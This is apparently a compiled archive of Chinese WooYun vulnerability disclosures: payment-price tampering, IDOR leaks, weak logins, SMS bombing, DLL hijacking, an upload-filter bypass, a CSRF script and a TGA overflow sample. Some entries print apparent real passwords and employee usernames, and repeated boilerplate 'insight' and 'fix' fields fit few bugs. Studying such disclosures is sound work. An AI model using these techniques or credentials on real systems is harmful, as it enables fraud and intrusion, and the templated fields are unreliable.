**POC**: 3：构造订单截图，选取的是88元的票，-1的大人，2的小孩提交之后的结果：4：某电商平台支付金额的图：

**绕过**: 直接利用

**修复**: 不让提交负数吧
---

---
### [wooyun-2012-015660] 上海南站任意会员注册信息和领票人信息泄漏
**厂商**: 上海南站长途客运公司 | **年份**: 2012 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登录会员中心，进入基本资料进行抓包修改memberId成功显示其他用户的信息貌似memberId可以是递增，批量查数据

**POC**: 收货人信息遍历同上

**绕过**: 直接利用

**修复**: 程序猿加上cookie或者session一起查询吧。系统维护顺便改好吧。
---

---
### [wooyun-2012-06783] 安卓某社交平台文章推荐过滤html不严
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网页内容的html是以文本形式出现，某互联网公司读取的时候会执行

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0137030] 看我如何一元游玩上海野生动物园
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海野生动物园支付漏洞，可一元购买商城中所有东西~我还没去过，厂商送两张票让我跟我的同桌小红一起去观光可好。。。

**POC**: 请先注册一个号，作为测试用购买地址http://**.**.**.**/shop/index.php就买这个吧http://**.**.**.**/shop/proshow.php?NID=14成人票，价格120正常购物流程一直到这就要转到某电商平台付款了！于是掏出Burpsuite抓包点击去支付这里的=120就是价格了，改成 =1 forward跳到某电商平台支付页面咯~扫一扫即可支付成功~

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-0136073] 网站安全狗上传拦截bypass(两种姿势)
**厂商**: 安全狗 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 姿势一、大家还记得之前在zone上，有人将form-data改为f+orm-data进行绕过的case吗？所以google下Content-Disposition的value，发现有很多，每个都能上传成功，并且绕过。https://example.com/[已脱敏] name="file"; filename="bypass.php"Content-Type: application/octet-stream<?phpecho 'bypass safedog upload ';?>------

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 考虑综上情况
---

---
### [wooyun-2015-0143613] 某省某市国土资源局办公系统设计逻辑缺陷（可导致内部信息泄露）
**厂商**: mmgtj.mmzqoa.net | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网址：http://**.**.**.**/sys/loginInput.action，某省茂名市国土资源局OA系统，验证码可重用，用常用用户名和弱口令123456可获得一个有效账号，登陆后可查看通讯录，将通讯录再做成字典跑，可获得28个有效账号，登陆之后，可查看内部敏感文件，发送短信等。pangyongqiupanshidijianglinglingzhanghongzhengyonghengyangsenxuwenfenghuangzhiqianghuangguoyiliangjianlinsimingchenxiaofengfanglianghengzhonglishengmomingzhongfengqigujianfengmojiqiuwenjianlurushishoufashiguominglindisenliuxiaoxulianghonglinluxinyangweix

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2015-0143709] 中国人保移动客户端存在多处安全漏洞
**厂商**: 中国人保财险 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试的客户端信息：apk  : **.**.**.**sale.activity, 53, 1.1.1, 中国人保apkmd5: c8f0c09a6c123c244d4d46496eeac8bd证书 :certmd5: 18d31d9a9bfa45a62437334c2f9bca5dissuer: C=CN, ST=BeiJing, L=BeiJing, O=dtcloud, OU=dtcloud, CN=dtcloudsubject: C=CN, ST=BeiJing, L=BeiJing, O=dtcloud, OU=dtcloud, CN=dtcloud1.通讯协议使用http，敏感数据未做加密处理，很容易受到中间人攻击和网络嗅探，窃取用户隐私数据。2.应用本地明文存储账号密码，恶意程序可通过系统漏洞提升权限，窃取应用本地数据。账号密码存储在本地loginUser.xml文件中：3.

**POC**: 1.通讯协议使用http，敏感数据未做加密处理，很容易受到中间人攻击和网络嗅探，窃取用户隐私数据。2.应用本地明文存储账号密码，恶意程序可通过系统漏洞提升权限，窃取应用本地数据。账号密码存储在本地loginUser.xml文件中：3.webview远程代码执行漏洞，通过中间人攻击，向服务端返回的html页面插入恶意JS代码，窃取应用本地数据、执行恶意操作。通过fiddler代理，篡改服务端返回的html，植入webview漏洞检测代码：客户端显示暴露的JS接口对象：利用暴露的接口对象可执行任意命令，执行cat命令，查看本地loginUser.xml文件：4.客户端程序调试信息输出泄露用户数据：

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-054208] 利用某电商平台某活动套取现金（空手套白狼）
**厂商**: 某电商平台网 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先去这里领取红包。https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我专业。。。。。
---

---
### [wooyun-2014-082014] cmseasy设计逻辑缺陷可以不花钱买东西
**厂商**: cmseasy | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: archive_act.php:function orders_action() {$this->view->aid = trim(front::get('aid'));if (front::post('submit')) {$this->orders = new orders();$row = $this->orders->getrow("","adddate DESC");//var_dump(time());if($row['adddate'] && time() - $row['adddate'] <= intval(config::get('order_time'))){alerterror('操作频繁,请稍后再试');return;}if (front::$post['telphone'] == '') {alerterror('联系电话为必填！');return;}front

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0152057] 爱康国宾某处逻辑漏洞导致近2000W+的订单信息可泄露(包括姓名\手机号\邮箱\体检地点\时间\涉及好多企业用户)
**厂商**: 爱康国宾 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登录访问下面地址：https://example.com/[已脱敏]

**POC**: 以youku的员工yangwei为例，真名叫杨微，时间地点也出来了，不知道体检完报告会不会发我邮箱里ID简单证明，大概有2000W+

**绕过**: 直接利用

**修复**: 不要泄露我的信息哟，我有病！
---

---
### [wooyun-2013-037290] uc手机浏览器客户端存在url跳转漏洞（可被钓鱼利用）
**厂商**: UC Mobile | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 没有过滤@字符。输入www.baidu.com@wooyum.com.本来想传个图的。但是奈何本屌的手机不行啊。手机的截图放到电脑就高级马赛克了。。。

**POC**: 不证明了。。。你们输一下就知道了。

**绕过**: 直接利用

**修复**: 要不像火狐一样来个友好的提醒?
---

---
### [wooyun-2012-010614] 爱拍主站存在严重漏洞
**厂商**: 爱拍 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.是个支付漏洞哦，主站https://example.com/[已脱敏]

**POC**: 5.点击确认支付，抓包看数据：6.上图中post的内容：rc_c=14735649&pd_FrpId=CMBCHINA-NET&payType=1&chargeMoney_1=1000&p0_Cmd=Buy&p2_Order=很明显看出来参数chargeMoney_1表示需要支付的金额嘛，改成1元啦；7.跳转到银行支付页面咯8.我的测试到这一步就结束啦，没有买任何东西哦！厂商请自查啦！

**绕过**: 直接利用

**修复**: 签名很重要！！！
---

---
### [wooyun-2015-089708] vmware workstation 10 DLLHijacking(可用于留后门)
**厂商**: vmware | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: vmware workstation 10（其他版本也可能存在我没测试）vmware tools服务存在DLLHijacking可用于留后门。在windows目录下写入dll文件 dwmaapi.dll重启虚拟机，dwmaapi.dll会被加载执行。

**POC**: 现在我把一个有添加管理员功能的dll放到windows目录然后我重启下虚拟机。DLL被成功执行

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2015-0163258] 黄河农村商业银行某系统设计逻辑缺陷泄露企业信息
**厂商**: 黄河农村商业银行 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 设计逻辑缺陷。。。。密码弱口令黄河农村商业银行邮箱弱口令泄露企业信息http://**.**.**.**:6080/

**POC**: 黄河农村商业银行邮箱弱口令泄露企业信息http://**.**.**.**:6080/弱口令123456用户如下zhangjuanzhangwenyangjingliujielili登录邮箱查看来往邮件，涉及企业相关敏感信息

**绕过**: 直接利用

**修复**: 改口令，加验证码
---

---
### [wooyun-2013-038798] 某运营商某分站某处验证绕过可进行无限短信轰炸（二）
**厂商**: 某运营商 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://[IP已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 后端限制一下嘛，搞个大新闻，把程序员批判一番..
---

---
### [wooyun-2015-0142916] 某运营商系统漏洞导致可查已实名公民身份信息(家庭住址/本人照片及身份证正反面等)
**厂商**: cncert&公安一所 | **年份**: 2015 | **类型**: 用户资料大量泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 用户资料大量泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户资料大量泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这几天广东联通给我发了条短信，然后去实名验证，呵呵呵。就是在这个页面http://**.**.**.**/mall-web/busiNotice/list右下角有个在线实名验证的网站，需要调整地区为广东才能看到。实名验证地址**.**.**.**/RealWeb/home.htm进去就是个短信轰炸，提交了手机验证码后随便输入个姓名和身份证号码就能查到家庭住址（顺手查了下周鸿祎的水表），结合http://**.**.**.**/bugs/wooyun-2014-088669就能拿到189W+公民姓名，身份证和家庭住址。最后存放相片的地方地址大概为**.**.**.**/img/手机号码+（1：身份证正面，2：身份证反面，3：本人手持身份证照片）当然只能查已经在系统上实名认证的人的。证明看下面。

**POC**: 短信轰炸姓名身份证号码查家庭地址根据手机号查询已实名验证的用户的身份证正反面和本人手持身份证照片(撸完记得打码)

**绕过**: 直接利用

**修复**: 这系统太烂，简直就是给黑产送数据的。先下线吧。顺便问下能不实名不？
---

---
### [wooyun-2016-0170199] 互联网金融安全之某基金投资公司系统设计逻辑缺陷
**厂商**: 赛伯乐基金投资 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 几位员工弱口令，进入系统后 可以查看公司各种敏感信息比如通讯录，工资，投资标准，标书等。。。没多翻 截了2张图证明一下 就出来了https://example.com/[已脱敏] 123456弱口令 IDbaogang.sunchixian.linfangting.huangfeng.like.zhaomingsu.wang

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0108078] 贵州银行手机银行敏感日志信息存在泄露风险
**厂商**: 贵州银行 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: app信息：com.csii.guizhou_100546.apkapk  : com.csii.guizhou, 3, v1.1.2, 贵州银行apkmd5: b8599502065831077e94415ee0705086证书 :certmd5: 691453c34cf52dae3385ef1a6ae9c356issuer: C=CN, ST=Guizhou, L=Guiyang, O=BANK OF GUIZHOU., OU=IT dept., CN=www.bgzchina.comsubject: C=CN, ST=Guizhou, L=Guiyang, O=BANK OF GUIZHOU., OU=IT dept., CN=www.bgzchina.com

**POC**: 用户注册时在日志中存在敏感信息，包括姓名，电话，手机号，身份证号等信息。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-048695] UCloud 某处业务逻辑错误 可无限制使用海量带宽
**厂商**: UCloud | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1 问题描述开启共享带宽，弹性IP：EIP(免费赠送):2个，会将原有的带宽费用退还到余额#2 生成退款订单

**POC**: # 送了弹性IP，而且原有的远程IP还可以使用# 弹性IP可以免费升级到50M，而且是一年使用期限# 重复 #1 问题描述 中的过程，会生成多个EIP订单，点支付就会获得无数个弹性IP，带宽成指数增长。

**绕过**: 直接利用

**修复**: # 增强业务逻辑判断
---

---
### [wooyun-2012-010089] 某电商IM工具显IP漏洞
**厂商**: 某电商平台 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过hook某电商IM工具客户端（windows版）的RECV，获取到的封包的包头为00 01 00 00 00 00 00的封包，封包里面包含对方的帐号，帐号类型，而远程地址就是对方的IP地址。

**POC**: 原始封包：0001000000000010636E74616F62616FB0A2CDFACFD46970000000000000000000 01 00 00 00 00 00 10 包头63 6E 74 61 6F 62 61 6F cntaobao（帐号类型）B0 A2 CD FA CF D4 69 70 阿旺显ip（我的帐号）00 00 00 00 00 00 00 00 包尾而recv的远程地址就是对方的IP地址

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0158254] 成都三泰控股集团某系统设计逻辑缺陷可泄露内部信息
**厂商**: 成都三泰控股集团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0115025] p2p金融安全之金海贷又一严重逻辑漏洞
**厂商**: jinhaidai.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 积分兑换功能存在逻辑漏洞，攻击者可以利用该逻辑漏洞兑换任意金额和数量的红包，投资的时候红包可以当RMB使用的，功能URL如下：https://example.com/[已脱敏] /integral/onceconver?sub=10000&cge=0&dec=0 HTTP/1.1Host: www.jinhaidai.comJHD_CSRF_TOKEN=84a085480134a3949edcf917c744e0151c72e753将sub的值修改为10000，红包的金额就相当于1W元，然后将cge、dec的值都修改为0，继续点立即兑换，抓包如下：POST /integral/buyitem HTTP/1.1Host: www.jinhaidai.comJHD_CSRF_TOKEN=84a085480134a3949

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 同样的支付类逻辑漏洞，如果一定需要用URL传递相关参数，建议进行后端的签名验证。PS：请多给RANK，进入蓝V行列还是一条漫长的路.....
---

---
### [wooyun-2014-074966] 某信用卡APP某推广活动存在漏洞可能导致免费还信用卡
**厂商**: 某信用卡APP | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、手机安装某信用卡APP并注册登录，添加信用卡。点击“服务”按钮，再点击“还款金”，最后点顶部广告栏进入活动，见下图1（1.jpg）2、点击“立即充值”，填写持卡人姓名、借记卡银行、卡号，身份证号、手机号等信息。漏洞测试使用了某国有银行卡，余额为0。（图2）3、下一步验证身份，任意选择一张你添加的信用卡，并填写完整信用卡号，提交申请，并点击继续充值，接着提示 余额不足，但是这个时候已经充值了0.01 元 到验证的信用卡。共尝试了4次，每次都充值1分到验证的信用卡。（图3、4、5、6）

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 检查漏洞导致的原因并修复。
---

---
### [wooyun-2014-072586] 海豚浏览器表单请求伪造网站漏洞
**厂商**: 海豚浏览器 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 海豚浏览器 11.1.1测试手机为安卓4.4.2

**POC**: payload<script>var k=1;window.onblur=s();document.getElementById("xxx").submit();function s(){if(k>1){window.open("javascript:document.write(3)","lll");}k++;}function s2(){window.open("javascript:document.write(3)","lll");window.onblur=function(){};}</script><body><form id="xxx" action="https://www.

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-057164] 索乐游戏燃烧的蔬菜2可不付费无限购买道具
**厂商**: 索乐游戏 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在游戏内进行购买游戏道具时只要拦截信息发送即可成功购买.手机环境:Android 4.1.2拦截工具:LBE安全大师(用户较多安装的一款安全杀毒)步骤:拒绝发送短信即可购买成功

**POC**: 已测试可进行购买道具以及使用

**绕过**: 直接利用

**修复**: 接入SDK问题,厂家自行修复
---

---
### [wooyun-2015-0124417] 我是如何绕过某银行网银绕过账户锁定
**厂商**: 某银行 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 业务逻辑缺陷，锁定功能完美绕过

**POC**: 中行个人网银：https://example.com/[已脱敏] 直接登录：成功绕过：但是如果退出，再正常登录，会提示本账户依然处于锁定状态：也就是说账户依然没有解锁，但还是正常登录了

**绕过**: 过滤绕过

**修复**: 修改登录验证条件
---

---
### [wooyun-2014-053211]  钱大掌柜利用漏洞可变短信轰炸
**厂商**: 钱大掌柜 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 自动发送代码如下!https://example.com/[已脱敏]"+时间_取随机时间戳 ()+"&mobile=

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ....
---

---
### [wooyun-2015-0130728] 爱康国宾之中国国际航空公司密码重置功能存在严重逻辑漏洞
**厂商**: 爱康国宾 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先了解爱康国宾（1）访问链接https://example.com/[已脱敏]

**POC**: （6）使用00109000******70在爱康国宾会员登录页https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 需要服务器端检测，需要服务器端检测，需要服务器端检测！！！！
---

---
### [wooyun-2015-099198] 美橙互联免费获取旗下产品（非支付漏洞）
**厂商**: 美橙互联 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 某互联免费获取任意产品(非支付漏洞)不是普通白帽子，看不见洞洞，不知道会不会撞洞啊，~目测应该不会这个是2月三号的，现在都三月三号了，美橙互联不会这么没效率吧

**POC**: 需要花钱的是这样的<a coords="3" lang="3144" accesskey="2" title="此模板为标准功能型，请购买标准版产品" style="cursor: not-allowed;" class="opend" href="javascript:void(0);">开通</a>免费开通是这样的<a coords="1" lang="3151" accesskey="1" title="点击开通" class="open" href="javascript:void(0);">开通</a>我们在免费开通那里审查元素，把ID换成需要花钱的成功获取

**绕过**: 直接利用

**修复**: ~。~不懂
---

---
### [wooyun-2015-0146807] 当乐游戏中心windows版存在两处DLL劫持
**厂商**: d.cn | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载当乐游戏中心后，发现打不开程序。用OD看了一下，却发现了存在DLL劫持。

**POC**: 从图中可以看出程序在安装目录下查找这两个DLL，如果没有找到会到system32目录下寻找。但是当乐游戏中心安装后却没有这两个DLL，所以可以将恶意DLL释放到这两个目录下，就造成了DLL劫持。感觉还是有危害性的，毕竟可以直接通过USB在安卓手机上安装应用。BOOL APIENTRY DllMain( HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved){switch (ul_reason_for_call){case DLL_PROCESS_ATTACH:MessageBox(NULL, L"hello world", L"

**绕过**: 直接利用

**修复**: 加入这两个DLL
---

---
### [wooyun-2013-036975] 某电商平台浏览器多个DLL劫持漏洞
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台浏览器最新版（版本3.3.0.867），官方下载安装版本taobrowser([IP已脱敏])-bc-bjq.exe，windows xp sp4环境，某电商平台浏览器的主程序在运行中浏览某些特定网页(如某电商平台网自身)时会加载一个不带路径的dxva2.dll文件（该文件没有随某电商平台浏览器一起安装），导致恶意攻击者可以伪造该DLL文件用于劫持，严重时可危害浏览器用户的安全，如帐号窃取、网络钓鱼等。原因在于浏览器的核心模块bluesky.dll([IP已脱敏])延迟导入一些如dxva2.dll、mf.dll、mfplat.dll文件，而这些文件没有随安装程序一起安装，留下可利用机会。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 严格审查DLL加载。
---

---
### [wooyun-2015-0133243] 大特宝官网业务逻辑漏洞可免费甚至低款买保险
**厂商**: datebao.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看大家在找你们家的，想那就彻底些，免得后面出问题了那就麻烦了，提出来总比被人利用好！先看第一个问题：问题出在购买保险产品时，提交订单的步骤：如下，我们购买如下商品；正常600元；在立即购买时，有如下请求：其中参数amount 应该是倍数参数，也就是通过这个参数，我可以修改所要订购产品的价格，那爽了；我们来看怎么利用；GET /policy/buy/ajaxstorebuy?amount=200000&product_id=2 HTTP/1.1Host: www.datebao.comProxy-Connection: keep-aliveAccept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko

**POC**: 如上已证明！

**绕过**: 直接利用

**修复**: 你懂的；
---

---
### [wooyun-2014-084953] 豪杰大眼睛处理TGA文件格式缓冲区溢出漏洞（EIP可控）
**厂商**: 北京世纪豪杰计算机技术有限公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: poc：0200080000000064 0064000100010010FFFFFFFFFFFFFFFF FFCCCCCCCCFFFF把这些数据以16进制保存在文件中，重命名为poc.tga环境配置：windows xp sp3豪杰大眼睛2.5版本（不能先打开豪杰再载入图片，那样不会成功触发漏洞。而是对着图片直接右键：用大眼睛浏览）安装后，需要在工具-注册图像类型中注册所有的图片格式。在poc样本上右键，选择“用大眼睛预览”正常情况下程序会因崩溃而闪退，用OD调试会发现，EIP已经修改为我们定义的数值CCCCCCCCH。

**POC**: poc：0200080000000064 0064000100010010FFFFFFFFFFFFFFFF FFCCCCCCCCFFFF把这些数据以16进制保存在文件中，重命名为poc.tga偏移19H处的CCCCCCC为要控制的EIP地址，这里用CCCCCCCC表示。eip已经被修改

**绕过**: 直接利用

**修复**: 检测样本的有效性。
---

---
### [wooyun-2015-0164535] 多个大学邮箱系统设计逻辑缺陷
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: email account： lnnoi@**.**.**.**passwor：chenhanemail account： seulzb@**.**.**.**passwor：splzb318

**POC**: email account：jgdw@**.**.**.**passwor：jgdw7581email account： rscsbk@**.**.**.**password： shbx7980

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2015-0119917] 亚娃生活馆存在支付漏洞可导致成人用品一毛钱购买
**厂商**: 亚娃生活馆 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先我们打开网站：然后挑选自己喜欢的：去付款吧：到这一步时，亮出抓包工具：把标记出改为0.01接下来一路Forward下去：

**POC**: 接下来，将会是这样：

**绕过**: 直接利用

**修复**: 爱爱^_^
---

---
### [wooyun-2015-0156042] win7下搜狗输入法绕过登陆限制
**厂商**: 搜狗 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: win7旗舰版 + 搜狗输入法在用户锁屏状态下打开搜狗输入法输入状态.随便打几个字打开右下角设置加上64位密码查看器.你懂的...公司几乎所有的个人电脑都可以搞定了,只要装了搜狗的

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 偶尔发现的.修复不懂
---

---
### [wooyun-2013-018822] 爱爱医支付漏洞
**厂商**: 爱爱医 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题地址：继续教育学习卡https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 截断攻击

